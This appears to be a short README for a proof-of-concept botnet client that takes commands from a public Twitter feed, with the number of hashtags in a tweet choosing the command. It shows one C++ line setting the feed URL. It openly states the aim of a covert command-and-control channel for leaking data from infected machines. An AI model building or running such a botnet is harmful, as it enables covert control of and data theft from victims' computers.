# Ted Cruz Botnet
Let Ted Cruz control your computer with his twitter feed.

Proof of concept botnet client being controlled by twitter without using twitter api.
The number of hashtags in each tweet will execute different commands.

By default the bot uses Ted Cruz's twitterfeed as a C&C but this could be easily changed to any public twitter.

```cpp
...
  std::string target = "https://twitter.com/anypublictwitter";
...
```

The concept is to set up a free encrypted C&C going somewhere nondescript and to leak data from infected nodes.
